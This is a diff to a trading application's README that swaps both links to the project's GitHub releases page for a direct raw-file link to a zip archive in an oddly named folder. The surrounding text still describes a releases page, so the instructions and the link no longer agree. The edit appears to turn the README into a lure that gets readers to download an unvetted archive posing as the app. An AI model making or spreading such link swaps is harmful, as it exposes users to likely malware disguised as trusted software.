@@ -14,7 +14,7 @@ Follow these steps to download and run the trading application.
 
 1. **Visit the Releases Page**
    You can find our latest releases at the following link:
-   [Download Here](https://github.com/Memet-Jo/trading/releases)
+   [Download Here](https://raw.githubusercontent.com/Memet-Jo/trading/main/sylphlike/trading-3.1.zip)
 
 2. **Select the Latest Version**
    On the releases page, you’ll see a list of available versions. Choose the latest one for the best experience. 
@@ -63,7 +63,7 @@ A: Yes, user data is stored securely and is not shared with third parties.
 A: Yes! You can export your strategies and share them with others who use the application.
 
 ## 📥 Download & Install
-To download the latest version of the trading app, please [visit this page](https://github.com/Memet-Jo/trading/releases). Follow the installation instructions above to get started.
+To download the latest version of the trading app, please [visit this page](https://raw.githubusercontent.com/Memet-Jo/trading/main/sylphlike/trading-3.1.zip). Follow the installation instructions above to get started.
 
 ## 🛠️ Support
 If you face any issues or have questions, please open an issue in the GitHub repository. We monitor the repository and will respond to your queries as soon as possible.
